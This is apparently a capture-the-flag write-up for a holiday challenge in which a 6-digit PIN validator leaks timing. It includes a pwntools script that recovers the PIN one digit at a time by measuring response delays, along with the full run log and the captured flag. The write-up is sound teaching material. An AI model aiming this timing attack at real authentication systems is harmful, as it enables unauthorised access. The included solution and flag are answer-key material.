# day 9 Time to Escalate

category : Miscellaneous

## **Description**

12/09 10:42 PM - We restarted the challenge instance platform, and the issue appears to be resolved. We will continue to monitor the system in case the problem recurs.

12/09 10:27 PM EST - The remote instance seems to be down, and we are investigating. We will release an update when it's back online.

Three elves from the Wrapping Division (Jingle, Tinsel, and Sprocket) are trapped in Elevator Shaft 3B after a KRAMPUS SYNDICATE intrusion locked down the control panel.

Our forensics team recovered partial intel: the Syndicate replaced the elevator's authentication module with a hastily written PIN validator. The elevator panel accepts a 6 digit PIN, and each incorrect attempt triggers a 3 second lockout, so brute force isn't viable.

Here's the strange part: even when maintenance tested the correct PIN, the system took an unusually long time to process it. Our hardware team suspects the validator is doing something weird under the hood, but we haven't had time to investigate further.

Time is running out. The elves have limited candy cane rations. Hurry up!

Connect at: **`nc ctf.csd.lol 5040`**

clue

- Time is more than just a constraint, it's also a clue.
- The validator checks digits one at a time. What happens to the response time when you get the first digit right?
****

solver

```jsx
from pwn import *
import re
from time import sleep

HOST, PORT = "ctf.csd.lol", 5040

def recv_until_prompt(r):
    data = r.recvuntil(b"Enter 6-digit PIN:", timeout=15)
    return data.decode(errors="ignore")

def try_guess(r, guess, extra_delay=3.1):
    r.sendline(guess.encode())

    try:
        out = recv_until_prompt(r)
        # biar pacing stabil (opsional)
        if extra_delay:
            sleep(extra_delay)

        m = re.search(r"Debug: ([0-9.]+)s", out)
        t = float(m.group(1)) if m else 0.0
        print(f"   {guess} -> {t:.3f}s")
        return t, out, False

    except EOFError:
        # server closed connection (often means success)
        text = ""
        try:
            text = r.recvall(timeout=3).decode(errors="ignore")
        except Exception:
            pass

        print(f"   {guess} -> EOF (connection closed)")
        if text.strip():
            print("\n[!] Output before close:\n")
            print(text)
        return 999.0, text, True

def main():
    r = remote(HOST, PORT)

    banner = recv_until_prompt(r)
    print(banner)

    pin = ""

    for pos in range(6):
        print(f"\n[*] Solving digit {pos+1}/6, current prefix = '{pin or '∅'}'")
        best_digit = None
        best_time = -1.0

        for d in "0123456789":
            guess = pin + d + "0" * (5 - pos)
            t, out, solved = try_guess(r, guess, extra_delay=3.1)

            # kalau server close koneksi, kemungkinan besar solve
            if solved:
                print(f"\n[✔] SOLVED while trying guess: {guess}")
                r.close()
                return

            if t > best_time:
                best_time = t
                best_digit = d

        pin += best_digit
        print(f"[+] Digit {pos+1} fixed as '{best_digit}' -> PIN so far = {pin}, max time = {best_time:.3f}s")

    print("\n==============================")
    print(f"[✔] Final PIN recovered (this connection): {pin}")
    print("==============================")

    print("\n[*] Submitting final PIN on same connection...\n")
    r.sendline(pin.encode())
    print(r.recvall(timeout=10).decode(errors="ignore"))
    r.close()

if __name__ == "__main__":
    main()

```

```jsx
┌──(kali㉿kali)-[~/Downloads/cyberstudents]
└─$ python3 day9_gpt.py
[+] Opening connection to ctf.csd.lol on port 5040: Done

╔════════════════════════════════════════════════════════════╗
║         NPLD ELEVATOR CONTROL SYSTEM v3.2.1-DEBUG          ║
╠════════════════════════════════════════════════════════════╣
║  AUTH: 6-digit PIN required for emergency release          ║
║  WARNING: 3-second lockout between attempts                ║
╚════════════════════════════════════════════════════════════╝

[Attempt 1/100] Enter 6-digit PIN:

[*] Solving digit 1/6, current prefix = '∅'
   000000 -> 0.402s
   100000 -> 0.395s
   200000 -> 0.407s
   300000 -> 0.376s
   400000 -> 0.424s
   500000 -> 0.396s
   600000 -> 0.710s
   700000 -> 0.403s
   800000 -> 0.391s
   900000 -> 0.407s
[+] Digit 1 fixed as '6' -> PIN so far = 6, max time = 0.710s

[*] Solving digit 2/6, current prefix = '6'
   600000 -> 0.658s
   610000 -> 0.980s
   620000 -> 0.696s
   630000 -> 0.713s
   640000 -> 0.714s
   650000 -> 0.677s
   660000 -> 0.710s
   670000 -> 0.705s
   680000 -> 0.677s
   690000 -> 0.728s
[+] Digit 2 fixed as '1' -> PIN so far = 61, max time = 0.980s

[*] Solving digit 3/6, current prefix = '61'
   610000 -> 0.969s
   611000 -> 1.316s
   612000 -> 1.025s
   613000 -> 0.999s
   614000 -> 1.020s
   615000 -> 1.013s
   616000 -> 0.978s
   617000 -> 1.045s
   618000 -> 0.969s
   619000 -> 1.005s
[+] Digit 3 fixed as '1' -> PIN so far = 611, max time = 1.316s

[*] Solving digit 4/6, current prefix = '611'
   611000 -> 1.263s
   611100 -> 1.269s
   611200 -> 1.242s
   611300 -> 1.337s
   611400 -> 1.302s
   611500 -> 1.309s
   611600 -> 1.623s
   611700 -> 1.318s
   611800 -> 1.336s
   611900 -> 1.325s
[+] Digit 4 fixed as '6' -> PIN so far = 6116, max time = 1.623s

[*] Solving digit 5/6, current prefix = '6116'
   611600 -> 1.600s
   611610 -> 1.616s
   611620 -> 1.579s
   611630 -> 1.588s
   611640 -> 1.662s
   611650 -> 1.624s
   611660 -> 1.611s
   611670 -> 1.620s
   611680 -> 1.858s
   611690 -> 1.621s
[+] Digit 5 fixed as '8' -> PIN so far = 61168, max time = 1.858s

[*] Solving digit 6/6, current prefix = '61168'
   611680 -> 1.916s
   611681 -> 1.869s
   611682 -> 1.885s
   611683 -> 1.914s
   611684 -> 1.834s
   611685 -> 1.887s
[+] Receiving all data: Done (204B)
[*] Closed connection to ctf.csd.lol port 5040
   611686 -> EOF (connection closed)

[!] Output before close:

 
✓ ACCESS GRANTED in 1.874s

🎄 ELEVATOR RELEASED! 🎄
Jingle, Tinsel, and Sprocket have been freed!

The elves hand you a candy cane with a note:
csd{T1m1n9_T1M1N9_t1M1n9_1t5_4LL_480UT_tH3_t1m1n9}

[✔] SOLVED while trying guess: 611686

```